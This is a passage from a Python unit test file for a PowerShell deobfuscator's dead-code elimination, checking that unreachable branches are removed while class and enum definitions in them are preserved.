            Write-Host 'go'
            """
        ), cleandoc(
            """
            try {
              try {
                $Null = 5
              } catch {
                Write-Host 'in'
              }
            } catch {
              Write-Host 'out'
            }
            Write-Host 'go'
            """
        ), Ps1DeadCodeElimination)

    def test_a_prune_refused_for_the_class_it_would_drop(self):
        source = cleandoc(
            """
            if ($False) {
              class Foo {}
            } elseif ($c) {
              'x'
            }
            """
        )
        self._assertTreeIsIntact(source, source, Ps1DeadCodeElimination)

    def test_a_branch_that_never_runs_takes_its_redirection_with_it(self):
        result = self._apply(
            "if ($false) { Write-Host 'dead' > C:\\o.txt } else { Write-Host 'live' }",
            Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'live'")


class TestPs1TypeDefinitionsSurviveNeverRunCode(TestPs1):

    def test_a_class_in_a_constant_false_branch_survives_while_its_plain_twin_is_removed(self):
        kept = cleandoc(
            """
            if ($False) {
              class Foo {}
            }
            Write-Host 'live'
            """
        )
        self.assertEqual(self._deobfuscate_iterative(kept), kept)
        self.assertEqual(
            self._deobfuscate_iterative("if ($False) { Write-Host 'dead' }\nWrite-Host 'live'"),
            "Write-Host 'live'")

    def test_an_enum_in_a_never_entered_loop_body_survives_while_its_plain_twin_is_removed(self):
        kept = cleandoc(
            """
            while ($False) {
              enum Bar {
                A
              }
            }
            Write-Host 'live'
            """
        )
        self.assertEqual(self._deobfuscate_iterative(kept), kept)
        self.assertEqual(
            self._deobfuscate_iterative("while ($False) { Write-Host 'dead' }\nWrite-Host 'live'"),
            "Write-Host 'live'")

    def test_a_class_after_a_top_level_exit_survives_while_a_plain_statement_is_removed(self):
        kept = cleandoc(
            """
            [Foo]::new().Run()
            exit
            class Foo {
              [void] Run() {
                Write-Host 'run'
              }
            }
            """
        )
        self.assertEqual(self._deobfuscate_iterative(kept), kept)
        self.assertEqual(self._deobfuscate_iterative("exit\nWrite-Host 'dead'"), 'exit')

    def test_a_class_in_an_unselected_switch_clause_survives_while_its_plain_twin_collapses(self):
        kept = cleandoc(
            """
            switch (5) {
              3 {
                class Foo {}
              }
              5 {
                Write-Host 'live'
              }
            }
            """
        )
        self.assertEqual(self._deobfuscate_iterative(kept), kept)
        self.assertEqual(
            self._deobfuscate_iterative(
                "switch (5) { 3 { Write-Host 'dead' } 5 { Write-Host 'live' } }"),
            "Write-Host 'live'")

    def test_a_class_in_the_taken_branch_is_carried_out_while_junk_beside_it_is_stripped(self):
        result = self._deobfuscate_iterative(cleandoc(
            """
            if ($True) {
              class Foo {}
              $junk = 123
              Write-Host 'live'
            }
            """
        ))
        self.assertEqual(result, cleandoc(
            """
            class Foo {}
            Write-Host 'live'
            """
        ))
